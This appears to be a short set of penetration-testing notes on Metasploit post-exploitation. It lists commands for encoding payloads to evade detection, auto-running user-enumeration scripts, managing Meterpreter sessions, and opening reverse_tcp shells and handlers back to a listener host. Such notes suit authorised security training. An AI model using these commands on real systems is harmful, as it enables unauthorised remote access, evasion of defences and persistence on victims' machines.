View advanced options:
`show advanced`

A comon technique would be to use **EnableStageEndoding** with **StageEncoder** to bypass detection:
`set EnableStageEncoding true`
`set StageEncoder x86/shikata_ga_nai`
`exploit -j`

**AutoRunScript** can automatically run a script when a meterpeter connection is established:
`set AutoRunScript windows/gather/enum_logged_on_users`
`exploit -j`

Return to the Metasploit prompt without closing the connection:
`background`

List active session:
`sessions -l`

Return to a specific session:
`session -i <session_num>`

List protocols for use after initial compromise:
`transport list`

Add a new transport protocol to current session:
`transport add -t reverse_tcp -l 10.11.0.4 -p 4444`

Setting up a multi-handler and switching to new transport mode with **transport next** (will create a new session and close down old one):
`background`
`use multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set LHOST 10.11.0.4`
`set LPORT 5555`
`exploit -j`
`sessions -i 5`
`transport next`
`sessions -i 6`
